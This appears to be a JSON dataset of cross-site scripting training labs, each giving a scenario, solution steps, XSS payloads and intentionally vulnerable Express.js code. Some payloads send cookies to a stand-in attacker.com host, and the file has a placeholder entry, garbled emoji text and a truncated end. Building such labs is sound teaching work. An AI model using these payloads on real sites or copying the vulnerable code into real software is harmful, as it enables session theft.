[
    {
      "Lab scenario": "Stored XSS in PDF Generator's Metadata",
      "Lab Description": "The application allows users to upload documents and generates downloadable PDFs. However, the PDF metadata fields (e.g., title, author) are not sanitized. The application directly embeds user input into the PDF metadata.\nTo solve: Inject a JavaScript payload into the metadata field and trigger execution upon opening the document in a web viewer.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite's Repeater to submit a modified document upload request containing JavaScript payload in the metadata.",
        "Inspect the generated PDF file to confirm payload retention.",
        "Inject <script>alert(document.domain)</script> into the 'Author' field.",
        "Download and open the PDF in a browser-based PDF viewer.",
        "Observe the alert box confirming the XSS execution."
      ],
      "payloads": [
        "<script>alert('PDF-XSS')</script>",
        "<img src=x onerror=alert('PDF Vulnerability')>",
        "<svg/onload=alert('PDF Attack')>",
        "<iframe src='javascript:alert(\\'PDF\\')'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst multer = require('multer');\nconst fs = require('fs');\nconst pdfkit = require('pdfkit');\n\nconst app = express();\nconst upload = multer({ dest: 'uploads/' });\n\napp.post('/upload', upload.single('file'), (req, res) => {\n    const doc = new pdfkit();\n    const filePath = `uploads/${Date.now()}.pdf`;\n    doc.info.Title = req.body.title;\n    doc.info.Author = req.body.author;\n    doc.pipe(fs.createWriteStream(filePath));\n    doc.end();\n    res.send(`File saved: <a href='/${filePath}'>Download PDF</a>`);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));"
    },
    {
      "Lab scenario": "DOM-based XSS in WebSocket Chat Application",
      "Lab Description": "A WebSocket-based chat application dynamically updates messages on the page using JavaScript innerHTML. User input is passed directly to the DOM without sanitization.\nTo solve: Inject a JavaScript payload into the chat input and trigger it upon rendering the received message.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use the browser console to establish a WebSocket connection.",
        "Send a malicious message payload: <img src=x onerror=alert(document.cookie)>",
        "Observe that the payload executes upon message rendering.",
        "Craft an obfuscated variation such as <svg/onload=alert(1)>.",
        "Confirm execution and exfiltration of user session cookies."
      ],
      "payloads": [
        "<img src=x onerror=alert(document.cookie)>",
        "<svg/onload=alert('Chat-XSS')>",
        "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
        "<body onload=alert('Chat Vulnerability')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const WebSocket = require('ws');\nconst express = require('express');\nconst app = express();\nconst server = require('http').createServer(app);\nconst wss = new WebSocket.Server({ server });\n\napp.use(express.static('public'));\n\nwss.on('connection', ws => {\n    ws.on('message', message => {\n        wss.clients.forEach(client => {\n            if (client.readyState === WebSocket.OPEN) {\n                client.send(`<b>${message}</b>`);\n            }\n        });\n    });\n});\n\nserver.listen(3000, () => console.log('WebSocket server running on port 3000'));"
    },
    {
      "Lab scenario": "Reflected XSS via HTTP Header in Error Logging",
      "Lab Description": "An API exposes an error page that reflects user-controlled data from the 'Referer' header without encoding. Attackers can inject JavaScript payloads via crafted HTTP requests.\nTo solve: Inject a payload into the 'Referer' header and trigger execution on the error page.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use Postman or Burp Suite to send a request with a modified 'Referer' header.",
        "Inject payload: <script>alert(document.domain)</script>.",
        "Observe the error page reflecting the payload.",
        "Modify the payload to use event-based execution: <img src=x onerror=alert(1)>.",
        "Confirm execution within the browser context."
      ],
      "payloads": [
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert('Header Vulnerability')>",
        "<svg/onload=alert(document.domain)>",
        "<script>window.location='http://attacker.com/?cookie='+document.cookie</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/error', (req, res) => {\n    const referer = req.headers['referer'] || 'Unknown';\n    res.send(`<h2>Error: Access denied from ${referer}</h2>`);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));"
    },
    {
      "Lab scenario": "Mutation-based XSS via Form Autofill",
      "Lab Description": "The web application includes an autofill mechanism that modifies DOM elements dynamically based on user input. However, it fails to properly sanitize input before updating the DOM, allowing attackers to execute malicious scripts.\nTo solve: Exploit the mutation event handler to trigger XSS upon autofill activation.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Inspect the form autofill mechanism in DevTools.",
        "Manually inject an event-based payload: <input onfocus=alert(1) autofocus>.",
        "Trigger the autofill process by navigating back to the form.",
        "Modify the attack to use a stealth payload: <svg onload=fetch('http://attacker.com')>.",
        "Confirm successful script execution and data exfiltration."
      ],
      "payloads": [
        "<input onfocus=alert(1) autofocus>",
        "<svg onload=alert('Autofill-XSS')>",
        "<script>alert('Autofill Attack')</script>",
        "<div contenteditable onfocus=alert('Mutation XSS')>Test</div>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n    res.send(`\n    <form>\n      <input type=\"text\" id=\"username\" placeholder=\"Enter username\">\n      <button type=\"submit\">Submit</button>\n    </form>\n    <script>\n      document.getElementById('username').oninput = function() {\n        document.getElementById('username').setAttribute('value', this.value);\n      };\n    </script>\n    `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));"
    },
    {
      "Lab scenario": "Reflected XSS in JSONP Callback Parameter",
      "Lab Description": "An API endpoint provides JSONP responses and accepts a user-supplied callback parameter without proper sanitization. This vulnerability allows an attacker to inject malicious JavaScript code that is executed in the context of the victim's browser when the response is loaded.\nTo solve: Craft a request with a malicious callback value that triggers script execution upon the JSONP response being processed by the browser.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Send a GET request to the vulnerable endpoint using Postman or a web browser.",
        "Set the callback parameter to a payload such as <script>alert('XSS')</script>.",
        "Observe the JSONP response reflecting the unsanitized callback parameter.",
        "Modify the payload to an obfuscated variant, e.g., <img src=x onerror=alert(1)> if necessary.",
        "Confirm that the payload executes when the response is processed in the browser."
      ],
      "payloads": [
        "<script>alert('JSONP-XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('JSONP Vulnerability')>",
        "<script>document.write('<img src=x onerror=alert(\\\"JSONP\\\")>')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\n// Vulnerable JSONP endpoint\napp.get('/data', (req, res) => {\n  const callback = req.query.callback || 'callback';\n  // Vulnerable: directly injecting the user-supplied callback into the response\n  const data = { message: 'Hello, World!' };\n  res.type('text/javascript');\n  res.send(`${callback}(${JSON.stringify(data)});`);\n});\n\napp.listen(3000, () => console.log('JSONP server running on port 3000'));\n"
    },
    {
      "Lab scenario": "Stored XSS in Comment System with Emoji Rendering",
      "Lab Description": "The application's comment system supports emoji rendering, but fails to properly sanitize user input before processing. Attackers can inject JavaScript payloads disguised as emoji text.\nTo solve: Inject a payload inside a comment and trigger execution upon rendering.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept a comment submission request.",
        "Inject payload disguised as an emoji: \u00f0\u0178\u02dc\u0160<script>alert(document.cookie)</script>.",
        "Submit the comment and reload the page.",
        "Observe the XSS execution when the comment is displayed.",
        "Confirm session hijacking by stealing cookies."
      ],
      "payloads": [
        "\u00f0\u0178\u02dc\u0160<script>alert(document.cookie)</script>",
        "\u00f0\u0178\u02dc\u0160<img src=x onerror=alert('Comment XSS')>",
        "\u00f0\u0178\u02dc\u0160<svg/onload=alert('Emoji XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.get('/', (req, res) => {\n    res.send(`<form action='/comment' method='POST'>\n      <input type='text' name='comment' placeholder='Enter comment'>\n      <button type='submit'>Post</button>\n    </form>\n    <div>${comments.join('<br>')}</div>`);\n});\napp.post('/comment', (req, res) => {\n    comments.push(req.body.comment);\n    res.redirect('/');\n});\napp.listen(3000, () => console.log('Server running on port 3000'));"
    },
    {
      "Lab scenario": "Reflected XSS in JSON API Response",
      "Lab Description": "The API returns user-provided input directly in a JSON response without encoding. JavaScript code injected into the 'message' parameter executes when viewed in certain browsers.\nTo solve: Inject a JavaScript payload into the 'message' parameter and trigger execution.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use Postman to send a request to /api/message?text=<script>alert(1)</script>.",
        "Observe the response reflecting the payload.",
        "Access the API response via a vulnerable browser context (e.g., an embedded iframe).",
        "Modify payload for obfuscation: \"><script>alert('XSS')</script>.",
        "Confirm successful execution within the browser."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "\"><script>alert('XSS')</script>",
        "<img src=x onerror=alert('JSON API XSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/api/message', (req, res) => {\n    res.json({ message: req.query.text });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));"
    },
    {
      "Lab scenario": "Stored XSS in GraphQL Query Response",
      "Lab Description": "A GraphQL API endpoint echoes user-controlled input in responses without sanitization. Attackers can inject malicious JavaScript that executes when another user queries the API.\nTo solve: Inject an XSS payload in a stored query field and retrieve it through another API call.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use GraphQL Playground to send a mutation request storing JavaScript in a query field.",
        "Inject: mutation { saveComment(text: \"<script>alert(1)</script>\") }.",
        "Send a GraphQL query to retrieve the stored comment.",
        "Observe XSS execution when the response is rendered in a web interface.",
        "Modify payload for stealth execution: <svg/onload=alert(1)>."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<svg/onload=alert('GraphQL XSS')>",
        "<img src=x onerror=alert('Stored GraphQL XSS')>",
        "<script>document.write('<img src=x onerror=alert(\\'XSS\\')>')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type Query { comments: [String] }\n  type Mutation { saveComment(text: String!): String }\n`);\n\nlet comments = [];\nconst root = {\n    comments: () => comments,\n    saveComment: ({ text }) => {\n        comments.push(text);\n        return 'Comment saved';\n    }\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true }));\napp.listen(3000, () => console.log('GraphQL server running on port 3000'));"
    },
    {
      "Lab scenario": "Mutation-based XSS in Event Listener",
      "Lab Description": "The application listens for user input events and updates the DOM dynamically. Malicious input can modify the event handler to execute arbitrary JavaScript.\nTo solve: Inject an XSS payload using an unexpected mutation event and trigger execution.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Inspect the page's JavaScript event listeners using DevTools.",
        "Identify an input field that triggers a mutation event.",
        "Inject payload into an input field: <input onfocus=alert(1) autofocus>.",
        "Navigate back to the input field to trigger the event.",
        "Observe XSS execution within the browser context."
      ],
      "payloads": [
        "<input onfocus=alert(1) autofocus>",
        "<svg onload=alert('Event XSS')>",
        "<script>alert('Mutation XSS')</script>",
        "<div contenteditable onfocus=alert('XSS via Mutation')>Edit me</div>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/', (req, res) => {\n    res.send(`\n    <form>\n      <input type='text' id='user_input' placeholder='Type something'>\n      <button type='submit'>Submit</button>\n    </form>\n    <script>\n      document.getElementById('user_input').addEventListener('input', function() {\n        document.getElementById('user_input').setAttribute('value', this.value);\n      });\n    </script>\n    `);\n});\napp.listen(3000, () => console.log('Server running on port 3000'));"
    },
    {
      "i need to generate lab here": "here"
    },
    {
      "Lab scenario": "Stored XSS in WebSocket Chat Application",
      "Lab Description": "A WebSocket-based chat application broadcasts user messages without proper sanitization, allowing stored XSS. The application directly inserts unsanitized messages into the DOM of connected clients.\nTo solve: Inject a JavaScript payload into a chat message and trigger execution on another client.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept a WebSocket message using Burp Suite to observe its structure.",
        "Inject a payload such as <script>alert('XSS')</script> into the chat message.",
        "Send the modified message through the WebSocket connection.",
        "Observe the payload execution on another connected client.",
        "Refine the payload using obfuscation (e.g., <img src=x onerror=alert(1)>) to bypass simple filters."
      ],
      "payloads": [
        "<script>alert('Chat XSS')</script>",
        "<img src=x onerror=alert('Chat XSS')>",
        "<svg/onload=alert('Chat Vulnerability')>",
        "<iframe src='javascript:alert(\"Chat XSS\")'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst http = require('http');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = http.createServer(app);\nconst wss = new WebSocket.Server({ server });\n\nwss.on('connection', ws => {\n    ws.on('message', message => {\n        // Vulnerable: directly broadcasting unsanitized message\n        wss.clients.forEach(client => {\n            if (client.readyState === WebSocket.OPEN) {\n                client.send(message);\n            }\n        });\n    });\n});\n\nserver.listen(3000, () => console.log('WebSocket server running on port 3000'));"
    },
    {
      "Lab scenario": "DOM-based XSS via window.name Property",
      "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability where the application reads the window.name property and injects its value into the HTML without sanitization.\nTo solve: Modify window.name with a JavaScript payload and trigger its execution on page load.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Open a new browser tab and set window.name to a payload, e.g., '<script>alert(\"XSS\")</script>'.",
        "Navigate to the vulnerable page that reads window.name.",
        "Observe the unsanitized insertion of window.name into the DOM.",
        "Test an obfuscated payload such as '<img src=x onerror=alert(1)>' to bypass filters.",
        "Confirm the payload execution upon page load."
      ],
      "payloads": [
        "<script>alert(\"window.name XSS\")</script>",
        "<img src=x onerror=alert('window.name vulnerability')>",
        "<svg/onload=alert('window.name')>",
        "<object data=\"javascript:alert('window.name')\"></object>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <script>\n          // Vulnerable: directly injecting window.name into the page\n          if(window.name) {\n            document.body.innerHTML += window.name;\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
    },
    {
      "Lab scenario": "Mutation-Based XSS in Content Editable Element",
      "Lab Description": "The application provides a contenteditable div for user input without proper sanitization, allowing an attacker to inject malicious scripts. The vulnerability lies in the dynamic mutation of the DOM based on user input.\nTo solve: Inject a JavaScript payload into the contenteditable area and trigger its execution upon re-rendering.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Locate the contenteditable div using browser DevTools.",
        "Inject a payload such as <div contenteditable='true'><script>alert('XSS')</script></div>.",
        "Submit the form to save the content.",
        "Reload the page to see the unsanitized content being rendered.",
        "Refine the payload to bypass potential filters, e.g., using an SVG onload event."
      ],
      "payloads": [
        "<script>alert('Editable XSS')</script>",
        "<img src=x onerror=alert('Editable XSS')>",
        "<svg/onload=alert('Editable Vulnerability')>",
        "<div contenteditable oninput=alert('ContentEditable XSS')>Edit me</div>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet storedContent = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <form action='/save' method='POST'>\n          <div contenteditable='true' id='editable' name='content'>${storedContent}</div>\n          <button type='submit'>Save</button>\n        </form>\n        <script>\n          // Vulnerable: client-side code that saves unsanitized input\n          document.getElementById('editable').addEventListener('input', function() {\n            this.setAttribute('value', this.innerHTML);\n          });\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/save', (req, res) => {\n  storedContent = req.body.content;\n  res.redirect('/');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
    },
    {
      "Lab scenario": "Reflected XSS in HTTP Response Header",
      "Lab Description": "This lab targets a vulnerability where the application reflects data from a custom HTTP header into the response header without sanitization. Attackers can inject malicious scripts that execute in the browser.\nTo solve: Inject an XSS payload in a custom header and observe its execution when the response header is processed.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Intercept an HTTP request using Burp Suite or Postman.",
        "Modify a custom header (e.g., X-Custom) to include the payload: <script>alert('XSS')</script>.",
        "Send the request and review the HTTP response headers.",
        "Craft a payload variant (e.g., <img src=x onerror=alert(1)>) to bypass basic filters.",
        "Confirm that the injected script executes in the browser context."
      ],
      "payloads": [
        "<script>alert('Header XSS')</script>",
        "<img src=x onerror=alert('Header Vulnerability')>",
        "<svg/onload=alert('Header')>",
        "<script>window.location='http://attacker.com/?cookie='+document.cookie</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  // Vulnerable: reflecting the custom header into the response header\n  const injectedHeader = req.headers['x-custom'] || 'No header provided';\n  res.setHeader('X-Injected', injectedHeader);\n  res.send('Check your browser console or header inspector.');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
    },
    {
      "Lab scenario": "Stored XSS in GraphQL Comment Field",
      "Lab Description": "A GraphQL API endpoint accepts and stores user comments without proper sanitization. When these comments are later rendered on a web page, the unsanitized content triggers an XSS attack.\nTo solve: Inject a JavaScript payload via a GraphQL mutation and trigger its execution during comment retrieval.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Access the GraphQL Playground to interact with the API.",
        "Send a mutation to add a comment: mutation { addComment(comment: \"<script>alert('XSS')</script>\") }.",
        "Execute a query to retrieve stored comments.",
        "Observe that the unsanitized comment executes in the client browser.",
        "Refine the payload to bypass filters, for example, using an SVG onload event."
      ],
      "payloads": [
        "<script>alert('GraphQL XSS')</script>",
        "<img src=x onerror=alert('GraphQL Vulnerability')>",
        "<svg/onload=alert('GraphQL XSS')>",
        "<script>document.write('<img src=x onerror=alert(\"GraphQL XSS\")>')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type Query { comments: [String] }\n  type Mutation { addComment(comment: String!): String }\n`);\n\nlet comments = [];\n\nconst root = {\n  comments: () => comments,\n  addComment: ({ comment }) => {\n    // Vulnerable: storing unsanitized comment\n    comments.push(comment);\n    return 'Comment saved';\n  }\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(3000, () => console.log('GraphQL API running on port 3000'));\n"
    },
    {
      "Lab scenario": "Stored XSS in Notification Panel",
      "Lab Description": "The application maintains a notification panel where server-stored messages are rendered on the client without proper sanitization. Attackers can inject JavaScript payloads into notification messages that persist and execute when viewed.\nTo solve: Inject a payload into the notification submission and trigger its execution when the panel reloads.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept a notification submission using Burp Suite and modify the payload.",
        "Inject a script payload such as <script>alert('XSS')</script> into the notification message.",
        "Submit the modified notification to store it on the server.",
        "Refresh the notification panel and observe the payload execution.",
        "Refine the payload using an obfuscated variant (e.g., <img src=x onerror=alert(1)>) to bypass filters."
      ],
      "payloads": [
        "<script>alert('Notification XSS')</script>",
        "<img src=x onerror=alert('Notification XSS')>",
        "<svg/onload=alert('Notification XSS')>",
        "<iframe src='javascript:alert(\"Notification XSS\")'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet notifications = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/', (req, res) => {\n  let notifHTML = notifications.map(n => `<div>${n}</div>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Notifications</h2>\n        ${notifHTML}\n        <form action='/notify' method='POST'>\n          <input type='text' name='message' placeholder='Enter notification'>\n          <button type='submit'>Send</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/notify', (req, res) => {\n  // Vulnerable: unsanitized input is stored and rendered\n  notifications.push(req.body.message);\n  res.redirect('/');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
    },
    {
      "Lab scenario": "DOM-based XSS in GraphQL Subscription Display",
      "Lab Description": "This lab involves a GraphQL subscription that delivers real-time updates to a client-side dashboard. The subscription data is inserted into the DOM without proper encoding, allowing an attacker to deliver a malicious payload via the subscription stream.\nTo solve: Inject a payload through the subscription endpoint and trigger it when the client renders the data.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Connect to the GraphQL subscription endpoint via GraphQL Playground or a custom client.",
        "Send a subscription message containing a payload like <script>alert('XSS')</script>.",
        "Observe the client-side dashboard receiving and inserting the payload into the DOM.",
        "Alter the payload to bypass basic filters (e.g., using <svg/onload=alert(1)>).",
        "Confirm the script execution upon message rendering in the client."
      ],
      "payloads": [
        "<script>alert('GraphQL Subscription XSS')</script>",
        "<img src=x onerror=alert('GraphQL Subscription XSS')>",
        "<svg/onload=alert('GraphQL Subscription XSS')>",
        "<object data=\"javascript:alert('GraphQL Subscription XSS')\"></object>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst http = require('http');\nconst WebSocket = require('ws');\n\n// Simple GraphQL schema with subscription simulation\nconst schema = buildSchema(`\n  type Query { info: String }\n  type Mutation { sendUpdate(message: String!): String }\n`);\n\nlet currentMessage = '';\nconst root = {\n  info: () => currentMessage,\n  sendUpdate: ({ message }) => {\n    // Vulnerable: storing unsanitized subscription message\n    currentMessage = message;\n    return 'Update sent';\n  }\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema,\n  rootValue: root,\n  graphiql: true\n}));\n\nconst server = http.createServer(app);\nconst wss = new WebSocket.Server({ server });\n\n// Simulate pushing subscription updates to all clients\nsetInterval(() => {\n  wss.clients.forEach(client => {\n    if (client.readyState === WebSocket.OPEN) {\n      client.send(currentMessage);\n    }\n  });\n}, 5000);\n\nserver.listen(3000, () => console.log('GraphQL subscription server running on port 3000'));\n"
    },
    {
      "Lab scenario": "Reflected XSS in URL Fragment Parsing",
      "Lab Description": "The client-side script extracts the URL fragment (window.location.hash) and injects it into the DOM without proper sanitization. An attacker can craft a URL with a malicious hash that executes arbitrary JavaScript when the page loads.\nTo solve: Modify the URL fragment to include a payload and trigger its execution in the browser.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Open the vulnerable page in a browser.",
        "Append a malicious payload to the URL hash, e.g., #<script>alert('XSS')</script>.",
        "Reload the page to let the client-side script process the hash.",
        "Observe that the unsanitized hash is inserted into the DOM and executes.",
        "Test with an obfuscated payload (e.g., using <img src=x onerror=alert(1)>) to bypass simple filters."
      ],
      "payloads": [
        "<script>alert('URL Fragment XSS')</script>",
        "<img src=x onerror=alert('URL Fragment XSS')>",
        "<svg/onload=alert('URL Fragment XSS')>",
        "<body onload=alert('URL Fragment XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Welcome</h2>\n        <div id='content'></div>\n        <script>\n          // Vulnerable: directly using window.location.hash without sanitization\n          var hash = window.location.hash.substring(1);\n          if(hash) {\n            document.getElementById('content').innerHTML = hash;\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
    },
    {
      "Lab scenario": "Stored XSS in User Profile Update Section",
      "Lab Description": "Users can update their profile information, including a bio, which is stored on the server and rendered on their profile page. Lack of sanitization allows malicious scripts to persist and execute in the profile view.\nTo solve: Inject a JavaScript payload in the bio update and verify execution when the profile is loaded.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a profile update using Postman or the web interface with a payload like <script>alert('XSS')</script> in the bio field.",
        "Ensure the updated bio is stored on the server.",
        "Navigate to the profile page to view the stored bio.",
        "Observe that the payload executes in the user\u00e2\u20ac\u2122s browser.",
        "Refine the payload (e.g., <svg/onload=alert(1)>) to bypass simple input filters."
      ],
      "payloads": [
        "<script>alert('Profile XSS')</script>",
        "<img src=x onerror=alert('Profile XSS')>",
        "<svg/onload=alert('Profile XSS')>",
        "<iframe src='javascript:alert(\"Profile XSS\")'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userProfile = { bio: 'Default bio' };\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/profile', (req, res) => {\n  // Vulnerable: unsanitized user bio is rendered\n  res.send(`\n    <html>\n      <body>\n        <h2>User Profile</h2>\n        <div>${userProfile.bio}</div>\n        <form action='/update' method='POST'>\n          <input type='text' name='bio' placeholder='Update bio'>\n          <button type='submit'>Update</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/update', (req, res) => {\n  userProfile.bio = req.body.bio;\n  res.redirect('/profile');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
    },
    {
      "Lab scenario": "Mutation-based XSS via Drag-and-Drop File Upload",
      "Lab Description": "The application supports drag-and-drop file uploads and displays file metadata in a preview panel. The preview code unsafely uses innerHTML to render metadata, allowing mutation-based XSS when an attacker uploads a file with a maliciously crafted metadata field.\nTo solve: Modify the file metadata to include a payload and trigger its execution when the preview is rendered.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Simulate a file upload by sending a request with JSON file metadata using Postman or Burp Suite.",
        "Inject a payload such as <script>alert('XSS')</script> in the metadata field (e.g., file description).",
        "Upload the file and observe the preview panel rendering the metadata.",
        "Notice the unsanitized insertion of the payload causing script execution.",
        "Test a refined payload (e.g., <img src=x onerror=alert(1)>) to bypass basic sanitization."
      ],
      "payloads": [
        "<script>alert('File Upload XSS')</script>",
        "<img src=x onerror=alert('File Upload XSS')>",
        "<svg/onload=alert('File Upload XSS')>",
        "<object data=\"javascript:alert('File Upload XSS')\"></object>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\nlet filePreviews = [];\n\n// Endpoint to handle simulated file uploads with metadata\napp.post('/upload', (req, res) => {\n  // Vulnerable: storing unsanitized file metadata\n  filePreviews.push(req.body.metadata);\n  res.send('File uploaded');\n});\n\napp.get('/preview', (req, res) => {\n  let previewHTML = filePreviews.map(meta => `<div>${meta}</div>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>File Previews</h2>\n        ${previewHTML}\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
    },
    {
      "Lab scenario": "DOM-based XSS via Local Storage Injection",
      "Lab Description": "The application saves user preferences in the browser's localStorage and later reads them to personalize the UI. However, it fails to sanitize the stored values before inserting them into the DOM, allowing attackers to inject malicious scripts.\nTo solve: Inject a JavaScript payload into localStorage using browser DevTools and trigger its execution when the page loads.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Open the browser console and set a malicious value in localStorage, e.g., localStorage.setItem('prefs', '<script>alert(1)</script>').",
        "Reload the page to trigger the unsanitized insertion of the localStorage value into the DOM.",
        "Observe the execution of the injected payload.",
        "Test a bypass variant using an obfuscated payload, e.g., '<img src=x onerror=alert(1)>' stored instead.",
        "Confirm the successful script execution upon page reload."
      ],
      "payloads": [
        "<script>alert('LocalStorage XSS')</script>",
        "<img src=x onerror=alert('LocalStorage XSS')>",
        "<svg/onload=alert('LocalStorage XSS')>",
        "<iframe src='javascript:alert(\"LocalStorage XSS\")'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <head>\n        <title>Preference Loader</title>\n      </head>\n      <body>\n        <h2>Welcome Back!</h2>\n        <div id='userPrefs'></div>\n        <script>\n          // Vulnerable: directly using localStorage content without sanitization\n          var prefs = localStorage.getItem('prefs');\n          if(prefs) {\n            document.getElementById('userPrefs').innerHTML = prefs;\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
    },
    {
      "Lab scenario": "Reflected XSS in REST API Error Message",
      "Lab Description": "An API endpoint designed to handle user requests returns error messages containing the unsanitized user input. An attacker can supply a malicious value that gets reflected in the error message, leading to XSS when the error is displayed in the browser.\nTo solve: Craft a request with a payload in the input parameter and trigger the reflected error message.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use Postman or Burp Suite to send a request with an invalid parameter value including a payload, e.g., <script>alert('XSS')</script>.",
        "Observe the error message reflecting the payload in the API response.",
        "Modify the payload to bypass simple filters, e.g., using <img src=x onerror=alert(1)>.",
        "Reload the request and inspect the response in a vulnerable browser context.",
        "Confirm execution of the injected script from the error message."
      ],
      "payloads": [
        "<script>alert('REST API XSS')</script>",
        "<img src=x onerror=alert('REST API XSS')>",
        "<svg/onload=alert('REST API XSS')>",
        "<body onload=alert('REST API XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const userInput = req.query.input || '';\n  // Vulnerable: reflecting user input in error message without sanitization\n  if (!userInput.match(/^[a-zA-Z0-9]+$/)) {\n    return res.status(400).send(`Error: Invalid input: ${userInput}`);\n  }\n  res.send('Valid input received');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
    },
    {
      "Lab scenario": "Stored XSS in Online Forum Post",
